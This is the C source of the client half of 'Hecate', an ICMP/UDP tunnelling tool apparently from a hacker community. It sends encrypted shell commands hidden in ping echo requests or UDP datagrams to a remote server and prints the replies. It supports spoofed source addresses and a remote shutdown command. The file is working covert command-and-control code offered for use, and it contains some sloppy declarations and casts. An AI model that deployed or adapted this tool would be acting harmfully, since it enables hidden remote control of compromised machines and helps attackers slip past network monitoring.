/*
 * CLIENT.C     HECATE PROJECT V1.0, ICMP/UDP TUNNELING TOOL
 *		-by the epiknet #ioc communauty, ioc@rootshell.be  
 * 
 *		CLIENT CODE
 *		~~~~~~~~~~~
 *	
 *		Tested on Linux Redhat 9.0 & Mandrake 9.1
 *     
 */

#include 	<sys/types.h>
#include	<sys/socket.h>
#include 	<netinet/udp.h>
#include 	<netinet/ip_icmp.h>
#include  	<linux/if_ether.h>
#include 	"hecate.h"


char 		*data;
struct iphdr	*ip,*ip;
struct icmphdr	*icmp, *icmp;
struct udphdr	*udp, *udp;

struct hostent 	*target;
struct sockaddr_in server;
struct sockaddr_in client; 
socklen_t	len;



void 
usage(char *progname)
{
	fprintf(stdout, "usage: %s [-vh] -p<icmp/udp> -t<dest_addr>\n\t"
		  "[-s<src_ip>] [-d<dest_port>] [-m <magic_num>] [-w <delay>]\n", progname
 	);

  	exit(1);
}



void
print_help(char *progname)
{

	fprintf(stdout, "%s%s%s", COLORON, GREETZ, COLOROFF);
	fprintf(stdout, "[-h]\t\tdisplays this help\n"
			"-p<icmp/udp>\tprotocol to use\n"
			"-t<target>\tserver address\n"
			"[-v]\t\tverbose mode\n"
			"[-s]<spoof>\tsource address, must be an IP\n"
			"[-d]<port>\tdestination port, for UDP dgrams\n"
			"[-m]<magic_num>\trecognize our dgrams, default is 666\n"
			"[-w]<delay>\tdealy before timeout, in sec\n"	
	); 	 
	
	exit(1);
}




void
quit(int a, int b)
{
	fprintf(stdout, "%d Packet(s) sent, %d Packet(s) recieved\n", a, b);
	fprintf(stdout, "%s", QUITMSG);
	exit(1);
}	

 



int 
main(int argc, char *argv[])
{

	int i, o, c;

       	int sock_recv;	
	int sent = 0, recv = 0;
	int delay = TIMEOUT;
	u_short magic_num = DEFAULT_NUM;
	int spoof = 0, verbose = 0, proto = 0;

	u_long client_addr, server_addr;

	/*
	 * getopt() stuff
	 */
	char *target;
 	int errorflag = 0;
        int tflag = 0, dflag = 0;
        
	
	/*
 	 * magic_num stuff
	 */
	u_short seqnum = magic_num;
	u_short dest_port = 0;
	u_short src_port = magic_num;
	i = INCREMENT;
	

	while ((o = getopt(argc,argv,"hs:t:d:p:m:w:v")) != -1)
		switch(o)
		{
			case 'h':
				print_help(argv[0]);
	    			break;

	   		case 't':
	    			tflag++;
	    			target = optarg;
	    			break;

	    		case 's':
				spoof++;
				client_addr = inet_addr(*(struct in_addr *)&optarg);
	  			break;

	    		case 'v':
	 			verbose++;
				break;
			
			case 'p':
				if(atoi(optarg) == 1)	proto = IPPROTO_ICMP;	
				if(atoi(optarg) == 17)  proto = IPPROTO_UDP;
				if(!strcasecmp(optarg, "icmp")) proto = IPPROTO_ICMP;
				if(!strcasecmp(optarg, "udp"))  proto = IPPROTO_UDP;
				break;

			case 'd':
				dflag++;
				dest_port = atoi(optarg);
				break;

			case 'm':
				magic_num = atoi(optarg);
				src_port = magic_num;
				seqnum = magic_num;
				break;

			case 'w':
				delay = atoi(optarg);
				break;

	    		default:
	   			errorflag++;
	    			break;
	  	}


	if (errorflag || !tflag)
		usage(argv[0]);


	if(geteuid() != 0){
		printf("%s :%s\n", argv[0], NEED_ROOT);
		exit(1);
	}


	/*
	 * Lame greetings =)
	 */
	fprintf(stdout, "%s%s%s",COLORON, GREETZ, COLOROFF);


	/* resolve target */
	if(((server_addr = lookup(target))) == -1){
		fprintf(stdout, "%s", ERRRESOLV);
		exit(1);
	}

	
	/* 
	 * protocol checks
	 */
	if(proto != IPPROTO_ICMP && proto != IPPROTO_UDP){
		fprintf(stdout, "\'-p\': bad option: protocol must be \'icmp\' or \'udp\'\n");
		exit(1);
	} 

	if(dest_port && proto == IPPROTO_ICMP){
		fprintf(stdout, "\'-d\': bad option: protocol isn't UDP\n");
		exit(1);
	}	



	/*
	 * Make a nice screen =)
	 */
	fprintf(stdout, "%s", WELCOMEMSG);
	if(spoof) fprintf(stdout, "%s", SPOOFON);
	if(proto == IPPROTO_ICMP) fprintf(stdout,"%s", ICMPUSE);
	if(proto == IPPROTO_UDP) fprintf(stdout, "%s", UDPUSE);
	fprintf(stdout,"with magic_num %d ...\n", magic_num);

	c=1;
	while(1)
	{
		prompt:
		printf("%s%s ~%d%s%s ", COLORON, PROMPTNAME, c++, PROMPT, COLOROFF);
		
		/* gets cmd from stdin */
		if((fgets(clear_cmd, CMD_SIZE, stdin)) == NULL){
			fprintf(stderr, "Can't get command");
			exit(1);
		}

		/* help given at prompt with '?' */
		if(strstr(clear_cmd, HELP) != NULL){
			prompt_help();
			goto prompt;
		}
		
		/* command to close the client */
		if(strstr(clear_cmd, QUITCMD)!=NULL)
			quit(sent, recv);
	
		/* encrypt cmd */
		do_crypt(clear_cmd, crypted_cmd);
	


		/*
	 	 * SEND ECHO_REQUEST
		 */
		if(proto == IPPROTO_ICMP)
		{
			if((send_ICMP(ICMP_ECHO, seqnum, server_addr, client_addr, crypted_cmd, spoof)) == -1){
				perror("send_ICMP()");
				return -1;
			}

			sent++;	
			if(verbose)  fprintf(stdout, "PING sent to %s, icmp_seq=%d\n", 
				     inet_ntoa(*(struct in_addr *)&server_addr), seqnum);

			magic_num+=i;
			seqnum = magic_num;
		}



		/* 
		 * SEND UDP DGRAM
		 */
		if(proto == IPPROTO_UDP)
		{
			if(!dflag) dest_port = random();

			if((send_UDP(dest_port, src_port, server_addr, client_addr, crypted_cmd, spoof)) == -1){
				perror("send_UDP()");
				return -1;
			}

			sent++;	
			if(verbose) fprintf(stdout, "UDP dgram sent to %s.%d\n", 
				    inet_ntoa(*(struct in_addr *)&server_addr), htons(dest_port));
			
			magic_num +=i;
			src_port = magic_num;
		}


		
		/* close the server remotly */
		if(strstr(clear_cmd, TURNOFF) != NULL){
			printf("%s", OFFMSG);
			quit(sent, recv);
		}


		if(spoof){
			magic_num+=i;
			seqnum = magic_num;
			src_port = magic_num;
			goto prompt;
		}
	

		/***********************************************
		 * DAEMON PART:  CLIENT IS WAITING FOR A REPLY * 
		 ***********************************************/
		while(1) 
		{
			if((sock_recv = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL))) == -1)
			{
               	        	fprintf(stdout, "Can't get SOCK_PAKCET socket\n");
				break;
				
			}

			/* socket timeout */
			if(timeout(delay, sock_recv) == -1){	
				perror("timeout()");
				break;
			}

			bzero(&packet_to_send, PACKET_SIZE);
			if(recvfrom(sock_recv, (char *)&packet_to_send, PACKET_SIZE, 0, 0, 0) < 0)
			{
				perror("recvfrom()");
				exit(-1);
			}


			ip = (struct iphdr *)(packet_to_send + sizeof(struct ethhdr));


			/******************************** 
			 * STEP 1: DEAL WITH ICMP DGRAM *
			 ********************************/
			if(ip->protocol == IPPROTO_ICMP)
			{ 
				icmp = (struct icmphdr *)(packet_to_send + sizeof(struct ethhdr) + 20);
				data = (char *)(packet_to_send + sizeof(struct ethhdr) + 20 + 8); 

				if(icmp->type == ICMP_ECHOREPLY && icmp->seq == htons(seqnum))
        			{		

					magic_num+=i;
					seqnum = magic_num;

					recv++;
					if(verbose)  fprintf(stdout, "PONG recieved from %s, icmp_seq=%d\n", 
						            inet_ntoa(*(struct in_addr *)&ip->saddr), 
							    htons(icmp->seq));
					                             
					if(!strlen(data)){
						fprintf(stdout,"%s", NODATA);
						goto end;
					}

					if(verbose) printf("---- DATAS ----\n");
					do_crypt(data, clear_data);	
					write(1, clear_data, strlen(clear_data));						
				}
			}



			/*******************************
			 * STEP 2: DEAL WITH UDP DGRAM *
			 *******************************/
			if(ip->protocol == IPPROTO_UDP)
			{
				udp = (struct udphdr *)(packet_to_send + sizeof(struct ethhdr) + 20);
				data = (char *)(packet_to_send + sizeof(struct ethhdr) + 20 + 8);
				

		 		if(udp->source == htons(src_port))
				{
					recv ++;
					magic_num+=i;
					src_port = magic_num;
					
					if(!strlen(data)){
						fprintf(stdout, "%s", NODATA);
						goto end;
					}
					
					do_crypt(data, clear_data);

					if(verbose){
						printf("UDP dgram recieved from %s.%d\n",
						inet_ntoa(*(struct in_addr *)&ip->saddr) , htons(udp->source)); 
						printf("---- DATAS ----\n");
					}

					write(1, clear_data, strlen(clear_data));
				}
			}

			end:
			close(sock_recv);
			bzero(&packet_to_send, PACKET_SIZE);
			break;			
		} 
	}       
}  
